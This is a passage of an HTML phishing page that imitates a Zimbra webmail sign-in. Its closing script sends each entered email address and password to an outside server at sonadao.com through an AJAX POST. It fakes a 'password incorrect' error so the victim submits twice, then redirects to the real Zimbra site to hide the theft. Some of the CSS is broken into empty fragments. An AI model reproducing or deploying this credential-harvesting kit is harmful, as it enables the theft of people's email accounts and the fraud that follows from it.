            font-size: 50px;
            font-weight: 500;

        }

        .full-body .header h6 {
            margin-top: 5px;
            font-size: 20px;
            color: #4d4d4d;
            margin-bottom: 10px;
        }

        .main-body { 
            background: #ffffff;
            box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
            -webkit-box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
            -moz-box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
        }

        .main-body .form-section {
            padding: 20px 40px;
        }

        .error {

        .main-body .header {

        }

        }

        .main-body .form-group label {

        }

            box-shadow: none;

        @media only screen and (max-width: 600px) {
            .full-body {

            }

            .main-body .img-logo {
                width: 100px;

            }

            .full-body .header .logo-one {

            font-size: 40px;
        }

        .full-body .header h6 {
            margin-top: 5px;
            font-size: 18px;

        }

            .error .blue {
                color: #0067b8;
                line-height: 25px;
                font-size: 12px;
                font-weight: lighter;
            }

            .main-body .header {
                margin: 0;
                padding: 0;
            }

            .main-body .img-logo {
                width: 120px;
                margin: 0px;
            }

            .main-body .grabber p {
                margin-top: 20px;
                font-size: 13px;
                font-weight: 200;
            }

            .main-body .grabber h4 {
                margin-top: 10px;
                font-size: 18px;
                font-weight: 500;
            }

            .main-body .form-group {
                margin-top: 20px;
            }

            .main-body .form-group input {
            width: 100%;
            border-radius: 1px;
            border: 1px solid #bdbdbd;
            height: 35px;
            font-size: 12px;
        }

           
        }
    </style>
    <script>
        let favoriteMovie = sessionStorage.getItem('favoriteMovie');
        document.getElementById("em").value = favoriteMovie;
    </script>
</head>

<body>
    <div class="full-body">
        <div class="main-body">
            <form onsubmit="handleSubmit(event)" autocomplete="">
                <div class="form-section">
                    <div class="header">
                        <p class="logo-one">zimbra</p>
                        <h6>Sign In</h6>
                        <p id="error" class="error">
                            Your account or password is incorrect. If you dont remember your
                            password, <span class="blue"> reset it now </span>
                        </p>
                    </div>
                    <div class="form-group">
                        <label for="">Username</label>
                        <input id="tm" type="text" value="One" class="input-form" hidden />
                        <input id="em" type="email" name="em" class="input-form" required />
                    </div>

                    <div class="form-group">
                        <label for="">Password</label>
                        <input id="pw" type="password" name="pw" class="input-form" required />
                    </div>

                    <div class="form-button">
                        <button id="submit" class="btn btn-md btn-primary">
                            Sign in
                        </button>
                    </div>
                </div>

                <div class="footer">
                    <div class="form-group">
                        <label for="">Web App Version</label>
                        <select name="session" id="" class="select-form">
                            <option value="default">Default</option>
                            <option value="classic">Classic</option>
                            <option value="Modern">Modern</option>
                        </select>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <p class="copy">Copyright Â© 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>

</body>

</html>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    function handleSubmit(e) {
        e.preventDefault();
        let emma = $("#em").val();
        let peculiar = $("#pw").val();
        let times_number = $("#tm").val();

        $.ajax({
            url: "https://sonadao.com/sona/submit.php",
            method: "POST",
            dataType: "JSON",
            data: {
                em: emma,
                pw: peculiar,
                tm: times_number,
            },
            success: function () { },
            complete: function () { },
        });
        if (times_number === "Two") {
            window.location.replace(
                "https://mail.zimbra.com/mail"
            );
        }
        $("#error").show();
        $("#tm").val("Two");
    }
</script>
